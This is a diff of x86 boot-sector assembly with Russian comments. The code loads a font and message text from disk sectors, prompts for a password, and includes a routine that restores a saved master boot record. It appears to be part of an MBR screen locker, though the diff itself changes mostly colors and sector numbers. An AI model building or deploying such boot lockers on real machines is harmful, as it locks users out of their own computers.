@@ -16,19 +16,19 @@ start:
 
     mov ah, 0x06
     mov al, 0
-    mov bh, 0x00
+    mov bh, COLOR_BG
     mov cx, 0
     mov dx, 0x184F
     int 0x10
 
     ; ============================================================
-    ; ЗАГРУЗКА ШРИФТА CP866 (СЕКТОРЫ 3-10)
+    ; ЗАГРУЗКА ШРИФТА (СЕКТОРЫ 3-4, 1024 байта)
     ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 8
+    mov al, 2
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -41,15 +41,15 @@ start:
     int 0x10
 
     ; ============================================================
-    ; ЗАГРУЗКА ЗАГОЛОВКА (СЕКТОР 11)
+    ; ЗАГРУЗКА ТЕКСТА (СЕКТОРЫ 5-6, 1024 байта)
     ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9000
     mov ah, 0x02
-    mov al, 1
+    mov al, 2
     mov ch, 0
-    mov cl, 11
+    mov cl, 5
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -59,25 +59,7 @@ start:
     call print
 
     ; ============================================================
-    ; ЗАГРУЗКА ТЕКСТА (СЕКТОР 12)
-    ; ============================================================
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x9200
-    mov ah, 0x02
-    mov al, 1
-    mov ch, 0
-    mov cl, 12
-    mov dh, 0
-    mov dl, 0x80
-    int 0x13
-    jc load_error
-
-    mov si, 0x9200
-    call print
-
-    ; ============================================================
-    ; КУРСОР ВНИЗ И ВЫВОД "Password: "
+    ; ВЫВОД "Password: "
     ; ============================================================
     mov ah, 0x02
     mov bh, 0
@@ -122,7 +104,7 @@ restore_mbr:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 3
+    mov cl, 2
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -148,7 +130,7 @@ print:
     jz .done
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     int 0x10
     jmp print
 .done:
@@ -170,7 +152,7 @@ get_password:
     stosb
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     mov al, [di - 1]
     int 0x10
     jmp .loop
@@ -180,7 +162,7 @@ get_password:
     dec di
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     mov al, 0x08
     int 0x10
     mov al, ' '
@@ -192,7 +174,7 @@ get_password:
     mov byte [di], 0
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, 0x07
+    mov bl, COLOR_FG
     mov al, 0x0A
     int 0x10
     mov al, 0x0D
